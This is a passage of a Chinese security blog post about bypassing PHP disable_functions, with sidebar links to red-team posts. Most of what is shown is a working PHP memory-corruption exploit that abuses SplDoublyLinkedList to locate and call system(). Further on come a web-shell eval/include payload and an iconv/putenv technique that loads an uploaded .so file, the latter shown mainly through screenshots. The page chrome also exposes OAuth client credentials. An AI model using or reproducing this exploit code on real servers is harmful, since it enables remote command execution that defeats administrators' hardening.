  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Object: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$closure_object</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

  <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">echo</span> <span class="token string">"[+]Closure Handler: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$system_address</span> <span class="token operator">=</span> <span class="token function">getSystem</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_handlers</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Couldn't determine system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token keyword">echo</span> <span class="token string">"[+]Find system's handler: "</span> <span class="token punctuation">.</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$system_address</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>

  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x506</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">0x130</span> <span class="token operator">/</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x08</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

     <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x08</span> <span class="token operator">*</span> <span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span> <span class="token operator">+</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$system_address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token variable">$closure_object</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x108</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">echo</span> <span class="token string">"[+]Executing command: \n"</span><span class="token punctuation">;</span>

 <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"php -v"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">canRead</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$chunkAddress</span> <span class="token operator">=</span> <span class="token function">getPHPChunk</span><span class="token punctuation">(</span><span class="token variable">$maps</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get PHP Chunk Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$elementAddress</span> <span class="token operator">=</span> <span class="token function">getElement</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$chunkAddress</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get SplDoublyLinkedList Element Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>



<span class="token keyword">function</span> <span class="token function">cantRead</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token keyword">global</span> <span class="token variable">$s</span><span class="token punctuation">;</span>

  <span class="token function">i2s</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Please try to get address of PHP Chunk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token function">bomb1</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"test2"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token variable">$elementAddress</span> <span class="token operator">=</span> <span class="token function">bomb2</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$elementAddress</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"[!]Get SplDoublyLinkedList Element Address Failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

 <span class="token punctuation">}</span>

  <span class="token function">bypass</span><span class="token punctuation">(</span><span class="token variable">$elementAddress</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>



<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplDoublyLinkedList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token string">"Twings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token number">0x100</span><span class="token punctuation">;</span><span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

  <span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0x1234567812345678</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token variable">$s</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180228698.png" alt="img"></p>
<p>然后通过首页的命令去包含这个</p>
<pre><code>a=eval($_POST[1]);&amp;1=include("/var/tmp/exp.php");</code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180522474.png" alt="img"></p>
<p>蚁剑的这个插件也可以绕过</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009175741321.png" alt="img"></p>
<p>直接读取命令乱码</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/009180101028.png" alt="img"></p>
<p>还是老老实实用exp</p>
<h3 id="利用iconv"><a href="#利用iconv" class="headerlink" title="利用iconv"></a>利用iconv</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>Linux 操作系统</li>
<li><code>putenv</code></li>
<li><code>iconv</code></li>
<li>存在可写的目录, 需要上传 <code>.so</code> 文件</li>
</ul>
<p>原理分析<a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/" target="_blank" rel="noopener">https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/</a></p>
<h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230234108.png" alt="image-20211009230234108"></p>
<p>然后使用蚁剑的插件</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230304882.png" alt="image-20211009230304882"></p>
<p>然后会生成一个文件</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230340108.png" alt="image-20211009230340108"></p>
<p>然后跟php-fpm一样创建一个副本</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230432238.png" alt="image-20211009230432238"></p>
<p>打开终端</p>
<p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211009230444316.png" alt="image-20211009230444316"></p>
<p>成功执行命令</p>
<p>参考链接：</p>
<p>[<a href="https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/]" target="_blank" rel="noopener">https://whoamianony.top/2021/03/13/Web%E5%AE%89%E5%85%A8/Bypass%20Disable_functions/]</a>(<a href="https://whoamianony.top/2021/03/13/Web安全/Bypass" target="_blank" rel="noopener">https://whoamianony.top/2021/03/13/Web安全/Bypass</a> Disable_functions/)</p>
<p><a href="https://xz.aliyun.com/t/10057#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/10057#toc-10</a></p>
<p><a href="https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/</a></p>
<p><a href="https://www.geekby.site/2021/08/常见bypass-disable-functions方法/" target="_blank" rel="noopener">https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/</a></p>
<p><a href="https://zgao.top/利用ld_preload实现函数劫持以及用法总结/" target="_blank" rel="noopener">https://zgao.top/%E5%88%A9%E7%94%A8ld_preload%E5%AE%9E%E7%8E%B0%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81%E4%BB%A5%E5%8F%8A%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://www.freebuf.com/column/216669.html" target="_blank" rel="noopener">https://www.freebuf.com/column/216669.html</a></p>
<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#LD-PRELOAD" target="_blank" rel="noopener">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html#LD-PRELOAD</a></p>

            </div>
            <hr />

            

            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">

<div id="article-share">
    
    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
    
</div>

<script src="/libs/share/js/social-share.min.js"></script>

            

    <div class="reprint" id="reprint-statement">
        <p class="reprint-tip">
            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
            <span>转载规则</span>
        </p>
        
            <div class="center-align">
                <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                    <img alt=""
                         style="border-width:0"
                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
                </a>
            </div>
            <br/>
            <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                  property="dct:title" rel="dct:type">
                    《绕过disable_functions》
                </span> 由
            <a xmlns:cc="http://creativecommons.org/ns#" href="/posts/c927.html" property="cc:attributionName"
               rel="cc:attributionURL">
                Ash
            </a> 采用
            <a rel="license" href="https://creativecommons.org/licenses/by/4.0/deed.zh">
                知识共享署名 4.0 国际许可协议
            </a>进行许可。
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>


        </div>
    </div>

    
    <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '5f6a33d3f041b84cc758',
        clientSecret: '9917df2bf95660c0c5a4c4ed5258657e8a33ff06',
        repo: 'ashupup.github.io',
        owner: 'ashupup',
        admin: "ashupup",
        id: 'posts/c927.html',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>
    

    

    

    

    
    <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments input[type=text],
    #vcomments input[type=email],
    #vcomments input[type=url],
    #vcomments textarea {
        box-sizing: border-box;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #42b983;
        font-weight: 500;
        text-decoration: underline;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div id="vcomments" class="card-content"></div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="/libs/valine/Valine.min.js"></script>
<!-- <script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script> -->

<script>
    new Valine({
        el: '#vcomments',
        appId: '7L1jqcYvPP5zvWKqPh8gu4x7-gzGzoHsz',
        appKey: '4KfB3JmjPtItJRq4gMEvhqfy',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'false' === 'true',
        avatar: 'wavatar',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: '如果你没有GitHub账号，还可以在这里评论啦！'
    });
</script>

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/posts/41ff.html">
                    <div class="card-image">
                        
                        
                        <img src="/images/loading.gif" data-original="/medias/featureimages/8.jpg" class="responsive-img" alt="不死马php">
                        
                        <span class="card-title">不死马php</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            不死php webshell什么是不死马何为不死马，简而言之杀不死的🐎，就是运行一段不会退出进程（注入php进程里面的，也称PHP的内存马）的木马，并且是无限执行的。主要作用就是去维持权限。

在实战当中，虽然很少去利用，但是有的时候也可
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="fa fa-clock-o fa-fw icon-date"></i>2021-10-12
                        </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/红队技巧/" class="post-category" target="_blank">
                                    红队技巧
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/红队技巧/" target="_blank">
                        <span class="chip bg-color">红队技巧</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/posts/fdcd.html">
                    <div class="card-image">
                        
                        
                        <img src="/images/loading.gif" data-original="/medias/featureimages/9.jpg" class="responsive-img" alt="sql注入绕过安全狗">
                        
                        <span class="card-title">sql注入绕过安全狗</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            前言：之前看过了，一直没动手，不是个好习惯，要多动手多思考多钻研
sql注入之安全狗绕过官网下载的安全狗版本还是0.30255，这个绕过方式5月份就有了。
0x1环境准备win7  
WAF：安全狗4.0  0.30255
phpstudy
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-10-02
                            </span>
                        <span class="publish-author">
                            
                            <i class="fa fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/WAF绕过/" class="post-category" target="_blank">
                                    WAF绕过
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/WAF绕过/" target="_blank">
                        <span class="chip bg-color">WAF绕过</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>
</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: Ash<br />'
            + '作者: Ash<br />'
            + '链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
    });
</script>

    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
